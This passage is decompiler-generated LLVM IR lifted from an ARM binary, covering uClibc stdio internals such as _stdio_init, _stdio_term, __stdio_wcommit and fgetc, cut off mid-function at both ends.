  uselistorder i32 ()* @malloc, { 49, 48, 47, 4, 3, 2, 0, 1, 7, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 12, 11, 5, 4, 3, 2, 1, 8, 7, 6, 10, 9, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_166d0, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_166cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_166a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16688, { 1, 0 }
  uselistorder label %dec_label_pc_1664c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16624, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1660c, { 1, 0 }
  uselistorder label %dec_label_pc_165b0, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_165a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16588, { 1, 0 }
  uselistorder label %dec_label_pc_16548, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_16538, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16480, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_163e8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16390, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1632c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_162f4, { 1, 2, 0 }
}

define i32 @function_166e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_166e4:
  %v0_166e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_166e4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_166e4
  %v5_166e4 = sdiv i32 %arg2, 16
  %v6_166e4 = and i32 %v5_166e4, %arg1
  %v5_166e8 = sdiv i32 %arg2, 256
  %v6_166e8 = and i32 %v6_166e4, %v5_166e8
  %v2_166ec = mul i32 %v6_166e8, 91892
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_166e4, %bb
  %v3_166ec = phi i32 [ %arg1, %dec_label_pc_166e4 ], [ %v2_166ec, %bb ]
  ret i32 %v3_166ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_1671c = call i32 @__aeabi_read_tp()
  %v3_16720 = load i16, i16* @global_var_22294.357, align 2
  %v4_16720 = sext i16 %v3_16720 to i32
  store i32 %v4_16720, i32* @r3, align 4
  store i32 %v0_1671c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_1672c = add i32 %v4_16720, %v0_1671c
  %v3_1672c = inttoptr i32 %v2_1672c to i32*
  %v4_1672c = load i32, i32* %v3_1672c, align 4
  store i32 %v4_1672c, i32* @r6, align 4
  %v1_16730 = call i32 @isatty(i32 0)
  %v2_16738 = icmp eq i32 %v1_16730, 0
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* @r4, align 4
  br i1 %v2_16738, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_16744 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 308) to i16*), align 4
  %v7_16744 = zext i16 %v5_16744 to i32
  %v2_16748 = xor i32 %v7_16744, 256
  store i32 %v2_16748, i32* @r3, align 4
  %v2_1674c = trunc i32 %v2_16748 to i16
  store i16 %v2_1674c, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_16754 = call i32 @isatty(i32 1)
  %v2_16758 = icmp eq i32 %v1_16754, 0
  br i1 %v2_16758, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_16760 = load i32, i32* @r4, align 4
  %v2_16764 = add i32 %v1_16760, 376
  %v3_16764 = inttoptr i32 %v2_16764 to i16*
  %v4_16764 = load i16, i16* %v3_16764, align 2
  %v2_16768 = xor i16 %v4_16764, 256
  store i16 %v2_16768, i16* %v3_16764, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_16774 = load i16, i16* @global_var_22294.357, align 2
  %v4_16774 = sext i16 %v3_16774 to i32
  %v0_16778 = load i32, i32* @r6, align 4
  %v1_16778 = load i32, i32* @r5, align 4
  %v3_16778 = add i32 %v1_16778, %v4_16774
  %v4_16778 = inttoptr i32 %v3_16778 to i32*
  store i32 %v0_16778, i32* %v4_16778, align 4
  ret i32 %v1_16754

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_16794 = load i32, i32* @r4, align 4
  store i32 %v3_16794, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_167a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_167a8, i32* %r0.global-to-local, align 4
  %v5_167a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_167a8, i32* %r1.global-to-local, align 4
  %v8_167a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -33092) to i32*), align 4
  %v2_167b0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_167b0, i32* %r3.global-to-local, align 4
  store i32 %v2_167a8, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_167bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 152) to i32*), align 4
  store i32 %v2_167a8, i32* %r0.global-to-local, align 4
  store i32 %v5_167a8, i32* %r1.global-to-local, align 4
  store i32 %v8_167a8, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_167cc = inttoptr i32 %v4_167bc to i32*
  store i32 %v2_167a8, i32* %v1_167cc, align 4
  %v3_167cc = add i32 %v4_167bc, 4
  %v4_167cc = inttoptr i32 %v3_167cc to i32*
  %v5_167cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_167cc, i32* %v4_167cc, align 4
  %v6_167cc = add i32 %v4_167bc, 8
  %v7_167cc = inttoptr i32 %v6_167cc to i32*
  %v8_167cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_167cc, i32* %v7_167cc, align 4
  %v0_167d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_167d0 = inttoptr i32 %v0_167d0 to i32*
  %v2_167d0 = load i32, i32* %v1_167d0, align 4
  store i32 %v2_167d0, i32* %r0.global-to-local, align 4
  %v3_167d0 = add i32 %v0_167d0, 4
  %v4_167d0 = inttoptr i32 %v3_167d0 to i32*
  %v5_167d0 = load i32, i32* %v4_167d0, align 4
  store i32 %v5_167d0, i32* %r1.global-to-local, align 4
  %v6_167d0 = add i32 %v0_167d0, 8
  %v7_167d0 = inttoptr i32 %v6_167d0 to i32*
  %v8_167d0 = load i32, i32* %v7_167d0, align 4
  %v2_167d4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_167d4, i32* %r3.global-to-local, align 4
  store i32 %v2_167d0, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_167e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_167e0 = add i32 %v0_167e0, 76
  %v3_167e0 = inttoptr i32 %v2_167e0 to i32*
  %v4_167e0 = load i32, i32* %v3_167e0, align 4
  store i32 %v4_167e0, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_167e8 = inttoptr i32 %v4_167e0 to i32*
  %v2_167e8 = load i32, i32* %v1_167e8, align 4
  store i32 %v2_167e8, i32* %r5.global-to-local, align 4
  %v2_167ec = add i32 %v0_167e0, 160
  %v3_167ec = inttoptr i32 %v2_167ec to i32*
  %v4_167ec = load i32, i32* %v3_167ec, align 4
  store i32 %v2_167d0, i32* %r0.global-to-local, align 4
  store i32 %v5_167d0, i32* %r1.global-to-local, align 4
  store i32 %v8_167d0, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_167fc = add i32 %v0_167e0, -33124
  store i32 %v2_167fc, i32* %sl.global-to-local, align 4
  %v1_16800 = inttoptr i32 %v4_167ec to i32*
  store i32 %v2_167d0, i32* %v1_16800, align 4
  %v3_16800 = add i32 %v4_167ec, 4
  %v4_16800 = inttoptr i32 %v3_16800 to i32*
  %v5_16800 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16800, i32* %v4_16800, align 4
  %v6_16800 = add i32 %v4_167ec, 8
  %v7_16800 = inttoptr i32 %v6_16800 to i32*
  %v8_16800 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16800, i32* %v7_16800, align 4
  %v0_16890.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1689016 = icmp eq i32 %v0_16890.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1689818 = add i32 %v0_16890.pr, 56
  store i32 %v1_1689818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1689016, label %dec_label_pc_168a4, label %dec_label_pc_16808

dec_label_pc_16808:                               ; preds = %entry, %.thread10
  %v0_16808 = phi i32 [ %v3_1688c, %.thread10 ], [ %v0_16890.pr, %entry ]
  %v1_16808 = add i32 %v0_16808, 64
  %v2_16808 = inttoptr i32 %v1_16808 to i32*
  %v3_16808 = load i32, i32* %v2_16808, align 4
  store i32 %v3_16808, i32* %r3.global-to-local, align 4
  %v0_1680c = call i32 @__aeabi_read_tp()
  store i32 %v0_1680c, i32* %r0.global-to-local, align 4
  %v1_16810 = add i32 %v0_1680c, -1168
  store i32 %v1_16810, i32* %r6.global-to-local, align 4
  %v3_16814 = icmp uge i32 %v3_16808, %v1_16810
  store i1 %v3_16814, i1* %cpsr_c.global-to-local, align 1
  %v9_16814 = icmp eq i32 %v3_16808, %v1_16810
  br i1 %v9_16814, label %.thread1, label %dec_label_pc_16828

.thread1:                                         ; preds = %dec_label_pc_16808
  %v1_16818 = load i32, i32* %r5.global-to-local, align 4
  %v2_16818 = add i32 %v1_16818, 60
  %v3_16818 = inttoptr i32 %v2_16818 to i32*
  %v4_16818 = load i32, i32* %v3_16818, align 4
  %v2_1681c = add i32 %v4_16818, 1
  store i32 %v2_1681c, i32* %r3.global-to-local, align 4
  store i32 %v2_1681c, i32* %v3_16818, align 4
  br label %.thread10

dec_label_pc_16828:                               ; preds = %dec_label_pc_16808, %dec_label_pc_16834
  %v0_16828 = load i32, i32* %r2.global-to-local, align 4
  %v1_16828 = inttoptr i32 %v0_16828 to i32*
  %v2_16828 = load i32, i32* %v1_16828, align 4
  store i32 %v2_16828, i32* %r3.global-to-local, align 4
  %v1_1682c = load i32, i32* %r4.global-to-local, align 4
  %v3_1682c = icmp uge i32 %v2_16828, %v1_1682c
  store i1 %v3_1682c, i1* %cpsr_c.global-to-local, align 1
  %v9_1682c = icmp eq i32 %v2_16828, %v1_1682c
  br i1 %v9_1682c, label %dec_label_pc_16834, label %dec_label_pc_1684c

dec_label_pc_16834:                               ; preds = %dec_label_pc_16828
  store i32 %v2_16828, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16844 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16844, label %dec_label_pc_16848, label %dec_label_pc_16828

dec_label_pc_16848:                               ; preds = %dec_label_pc_16834
  %v0_16848 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16848, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1684c

dec_label_pc_1684c:                               ; preds = %dec_label_pc_16828, %dec_label_pc_16848
  %v0_1684c = phi i32 [ %v0_16848, %dec_label_pc_16848 ], [ %v2_16828, %dec_label_pc_16828 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1684c = icmp eq i32 %v0_1684c, 0
  %v2_16858.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1684c, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_1684c
  %v1_16858 = load i32, i32* %r6.global-to-local, align 4
  %v3_16858 = add i32 %v2_16858.pre, 64
  %v4_16858 = inttoptr i32 %v3_16858 to i32*
  store i32 %v1_16858, i32* %v4_16858, align 4
  %v1_1685c = load i32, i32* %r1.global-to-local, align 4
  %v2_1685c = load i32, i32* %r5.global-to-local, align 4
  %v3_1685c = add i32 %v2_1685c, 60
  %v4_1685c = inttoptr i32 %v3_1685c to i32*
  store i32 %v1_1685c, i32* %v4_1685c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_1684c
  %v2_16850 = add i32 %v2_16858.pre, 8
  %v3_16850 = inttoptr i32 %v2_16850 to i32*
  %v4_16850 = load i32, i32* %v3_16850, align 4
  store i32 %v4_16850, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_16860 = add i32 %v2_16858.pre, 20
  %v4_16860 = inttoptr i32 %v3_16860 to i32*
  store i32 %v4_16850, i32* %v4_16860, align 4
  %v1_16864 = load i32, i32* %r2.global-to-local, align 4
  %v2_16864 = trunc i32 %v1_16864 to i16
  %v3_16864 = load i32, i32* %r5.global-to-local, align 4
  %v4_16864 = inttoptr i32 %v3_16864 to i16*
  store i16 %v2_16864, i16* %v4_16864, align 2
  %v1_16868 = load i32, i32* %r3.global-to-local, align 4
  %v2_16868 = load i32, i32* %r5.global-to-local, align 4
  %v3_16868 = add i32 %v2_16868, 24
  %v4_16868 = inttoptr i32 %v3_16868 to i32*
  store i32 %v1_16868, i32* %v4_16868, align 4
  %v1_1686c = load i32, i32* %r3.global-to-local, align 4
  %v2_1686c = load i32, i32* %r5.global-to-local, align 4
  %v3_1686c = add i32 %v2_1686c, 28
  %v4_1686c = inttoptr i32 %v3_1686c to i32*
  store i32 %v1_1686c, i32* %v4_1686c, align 4
  %v1_16870 = load i32, i32* %r3.global-to-local, align 4
  %v2_16870 = load i32, i32* %r5.global-to-local, align 4
  %v3_16870 = add i32 %v2_16870, 16
  %v4_16870 = inttoptr i32 %v3_16870 to i32*
  store i32 %v1_16870, i32* %v4_16870, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_16874 = load i32, i32* %sl.global-to-local, align 4
  %v1_16874 = inttoptr i32 %v0_16874 to i32*
  %v2_16874 = load i32, i32* %v1_16874, align 4
  store i32 %v2_16874, i32* %r0.global-to-local, align 4
  %v3_16874 = add i32 %v0_16874, 4
  %v4_16874 = inttoptr i32 %v3_16874 to i32*
  %v5_16874 = load i32, i32* %v4_16874, align 4
  store i32 %v5_16874, i32* %r1.global-to-local, align 4
  %v6_16874 = add i32 %v0_16874, 8
  %v7_16874 = inttoptr i32 %v6_16874 to i32*
  %v8_16874 = load i32, i32* %v7_16874, align 4
  store i32 %v8_16874, i32* %r2.global-to-local, align 4
  %v1_1687c = load i32, i32* %r5.global-to-local, align 4
  %v2_1687c = add i32 %v1_1687c, 52
  %v3_1687c = inttoptr i32 %v2_1687c to i32*
  store i32 1, i32* %v3_1687c, align 4
  %v0_16880 = load i32, i32* %r5.global-to-local, align 4
  %v1_16880 = add i32 %v0_16880, 56
  store i32 %v1_16880, i32* %r3.global-to-local, align 4
  %v2_16884 = load i32, i32* %r0.global-to-local, align 4
  %v1_16888 = inttoptr i32 %v1_16880 to i32*
  store i32 %v2_16884, i32* %v1_16888, align 4
  %v3_16888 = add i32 %v0_16880, 60
  %v4_16888 = inttoptr i32 %v3_16888 to i32*
  %v5_16888 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16888, i32* %v4_16888, align 4
  %v6_16888 = add i32 %v0_16880, 64
  %v7_16888 = inttoptr i32 %v6_16888 to i32*
  %v8_16888 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16888, i32* %v7_16888, align 4
  %v0_1688c = load i32, i32* %r5.global-to-local, align 4
  %v1_1688c = add i32 %v0_1688c, 32
  %v2_1688c = inttoptr i32 %v1_1688c to i32*
  %v3_1688c = load i32, i32* %v2_1688c, align 4
  store i32 %v3_1688c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16890 = icmp eq i32 %v3_1688c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_16898 = add i32 %v3_1688c, 56
  store i32 %v1_16898, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_16890, label %dec_label_pc_168a4, label %dec_label_pc_16808

dec_label_pc_168a4:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_168a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_168a8 = add i32 %v0_168a8, 76
  %v3_168a8 = inttoptr i32 %v2_168a8 to i32*
  %v4_168a8 = load i32, i32* %v3_168a8, align 4
  store i32 %v4_168a8, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_168a8 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168c814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_168c814, label %dec_label_pc_168d0, label %dec_label_pc_168b4

dec_label_pc_168b4:                               ; preds = %dec_label_pc_168a4, %dec_label_pc_168c8
  %v1_168bc = phi i32 [ %storemerge, %dec_label_pc_168c8 ], [ %storemerge12, %dec_label_pc_168a4 ]
  %v1_168b4 = inttoptr i32 %v1_168bc to i16*
  %v2_168b4 = load i16, i16* %v1_168b4, align 2
  %v3_168b4 = zext i16 %v2_168b4 to i32
  store i32 %v3_168b4, i32* %r3.global-to-local, align 4
  %v1_168b8 = and i32 %v3_168b4, 64
  %v2_168b8 = icmp eq i32 %v1_168b8, 0
  br i1 %v2_168b8, label %dec_label_pc_168c8, label %bb39

bb39:                                             ; preds = %dec_label_pc_168b4
  store i32 %v1_168bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_168c8

dec_label_pc_168c8:                               ; preds = %dec_label_pc_168b4, %bb39
  %v1_168c0 = xor i1 %v2_168b8, true
  call void @__pseudo_cond_branch(i1 %v1_168c0, i32 ptrtoint (i32* @global_var_168f8.647 to i32))
  %v0_168c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_168c4 = add i32 %v0_168c4, 32
  %storemerge.in = inttoptr i32 %v1_168c4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168c8 = icmp eq i32 %storemerge, 0
  br i1 %v2_168c8, label %dec_label_pc_168d0, label %dec_label_pc_168b4

dec_label_pc_168d0:                               ; preds = %dec_label_pc_168c8, %dec_label_pc_168a4
  %v2_168d4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_168d4, i32* %r4.global-to-local, align 4
  %v1_168d8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_168d8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1688c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1682c, { 1, 0 }
  uselistorder i32 %v4_167ec, { 2, 1, 0 }
  uselistorder i32 %v4_167bc, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 0, 5, 3, 4, 1 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_168c8, { 1, 0 }
  uselistorder label %dec_label_pc_168b4, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1684c, { 1, 0 }
  uselistorder label %dec_label_pc_16828, { 1, 0 }
  uselistorder label %dec_label_pc_16808, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_168f8 = load i32, i32* @r4, align 4
  store i32 %v3_168f8, i32* %stack_var_-8, align 4
  %v1_168fc = add i32 %arg1, 8
  %v2_168fc = inttoptr i32 %v1_168fc to i32*
  %v3_168fc = load i32, i32* %v2_168fc, align 4
  store i32 %v3_168fc, i32* @r1, align 4
  %v1_16900 = add i32 %arg1, 16
  %v2_16900 = inttoptr i32 %v1_16900 to i32*
  %v3_16900 = load i32, i32* %v2_16900, align 4
  %v9_16904 = icmp eq i32 %v3_16900, %v3_168fc
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_16904, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_168fc, i32* %v2_16900, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_16910 = xor i1 %v9_16904, true
  call void @__pseudo_cond_branch(i1 %v1_16910, i32 ptrtoint (i32* @global_var_182e8.648 to i32))
  %v0_16914 = load i32, i32* %r4.global-to-local, align 4
  %v1_16914 = add i32 %v0_16914, 8
  %v2_16914 = inttoptr i32 %v1_16914 to i32*
  %v3_16914 = load i32, i32* %v2_16914, align 4
  %v1_16918 = add i32 %v0_16914, 16
  %v2_16918 = inttoptr i32 %v1_16918 to i32*
  %v3_16918 = load i32, i32* %v2_16918, align 4
  %v2_1691c = sub i32 %v3_16918, %v3_16914
  %v2_16920 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16920, i32* @r4, align 4
  ret i32 %v2_1691c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16928 = load i32, i32* @r4, align 4
  store i32 %v3_16928, i32* %stack_var_-20, align 4
  %v6_16928 = load i32, i32* @r5, align 4
  %v9_16928 = load i32, i32* @r6, align 4
  %v12_16928 = load i32, i32* @r7, align 4
  %v15_16928 = load i32, i32* @lr, align 4
  %v1_1692c = add i32 %arg1, 52
  %v2_1692c = inttoptr i32 %v1_1692c to i32*
  %v3_1692c = load i32, i32* %v2_1692c, align 4
  store i32 %v3_1692c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16930 = icmp eq i32 %v3_1692c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_16930, label %dec_label_pc_16964, label %dec_label_pc_16940

dec_label_pc_16940:                               ; preds = %entry
  %v1_16940 = add i32 %arg1, 16
  %v2_16940 = inttoptr i32 %v1_16940 to i32*
  %v3_16940 = load i32, i32* %v2_16940, align 4
  store i32 %v3_16940, i32* %r2.global-to-local, align 4
  %v1_16944 = add i32 %arg1, 24
  %v2_16944 = inttoptr i32 %v1_16944 to i32*
  %v3_16944 = load i32, i32* %v2_16944, align 4
  store i32 %v3_16944, i32* %r3.global-to-local, align 4
  %v3_16948 = icmp uge i32 %v3_16940, %v3_16944
  store i1 %v3_16948, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_16948, label %dec_label_pc_16958, label %.thread

.thread:                                          ; preds = %dec_label_pc_16940
  %v2_1694c = inttoptr i32 %v3_16940 to i8*
  %v3_1694c = load i8, i8* %v2_1694c, align 1
  %v4_1694c = zext i8 %v3_1694c to i32
  store i32 %v4_1694c, i32* %r5.global-to-local, align 4
  %v6_1694c = add i32 %v3_16940, 1
  store i32 %v6_1694c, i32* %r2.global-to-local, align 4
  store i32 %v6_1694c, i32* %v2_16940, align 4
  br label %dec_label_pc_16a5c

dec_label_pc_16958:                               ; preds = %dec_label_pc_16940
  %v1_16958 = inttoptr i32 %arg1 to i16*
  %v2_16958 = call i32 @getc_unlocked(i16* %v1_16958)
  store i32 %v2_16958, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16a5c

dec_label_pc_16964:                               ; preds = %entry
  %v0_16964 = call i32 @__aeabi_read_tp()
  %v0_16968 = load i32, i32* @r7, align 4
  %v1_16968 = add i32 %v0_16968, 64
  %v2_16968 = inttoptr i32 %v1_16968 to i32*
  %v3_16968 = load i32, i32* %v2_16968, align 4
  store i32 %v3_16968, i32* %r3.global-to-local, align 4
  %v1_1696c = add i32 %v0_16964, -1168
  store i32 %v1_1696c, i32* @r6, align 4
  %v3_16970 = icmp uge i32 %v3_16968, %v1_1696c
  store i1 %v3_16970, i1* %cpsr_c.global-to-local, align 1
  %v9_16970 = icmp eq i32 %v3_16968, %v1_1696c
  br i1 %v9_16970, label %dec_label_pc_169b8, label %dec_label_pc_16978

dec_label_pc_16978:                               ; preds = %dec_label_pc_16964
  %v1_16978 = add i32 %v0_16968, 56
  store i32 %v1_16978, i32* @r5, align 4
  store i32 %v1_16978, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16984

dec_label_pc_16984:                               ; preds = %dec_label_pc_16990.dec_label_pc_16984_crit_edge, %dec_label_pc_16978
  %v0_16984 = phi i32 [ %v0_16984.pre, %dec_label_pc_16990.dec_label_pc_16984_crit_edge ], [ %v1_16978, %dec_label_pc_16978 ]
  %v1_16984 = inttoptr i32 %v0_16984 to i32*
  %v2_16984 = load i32, i32* %v1_16984, align 4
  store i32 %v2_16984, i32* %r3.global-to-local, align 4
  %v1_16988 = load i32, i32* @r4, align 4
  %v3_16988 = icmp uge i32 %v2_16984, %v1_16988
  store i1 %v3_16988, i1* %cpsr_c.global-to-local, align 1
  %v9_16988 = icmp eq i32 %v2_16984, %v1_16988
  br i1 %v9_16988, label %dec_label_pc_16990, label %dec_label_pc_169a8

dec_label_pc_16990:                               ; preds = %dec_label_pc_16984
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_169a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_169a0, label %dec_label_pc_169a4, label %dec_label_pc_16990.dec_label_pc_16984_crit_edge

dec_label_pc_16990.dec_label_pc_16984_crit_edge:  ; preds = %dec_label_pc_16990
  %v0_16984.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16984

dec_label_pc_169a4:                               ; preds = %dec_label_pc_16990
  %v0_169a4 = load i32, i32* @r4, align 4
  store i32 %v0_169a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169a8

dec_label_pc_169a8:                               ; preds = %dec_label_pc_16984, %dec_label_pc_169a4
  %v0_169a8 = phi i32 [ %v0_169a4, %dec_label_pc_169a4 ], [ %v2_16984, %dec_label_pc_16984 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_169a8 = icmp eq i32 %v0_169a8, 0
  br i1 %v2_169a8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_169a8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_169a8, %bb
  store i32 92596, i32* @lr, align 4
  %v1_169b0 = xor i1 %v2_169a8, true
  call void @__pseudo_cond_branch(i1 %v1_169b0, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_169b4 = load i32, i32* @r6, align 4
  %v1_169b4 = load i32, i32* @r7, align 4
  %v2_169b4 = add i32 %v1_169b4, 64
  %v3_169b4 = inttoptr i32 %v2_169b4 to i32*
  store i32 %v0_169b4, i32* %v3_169b4, align 4
  %v0_169b8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_169b8

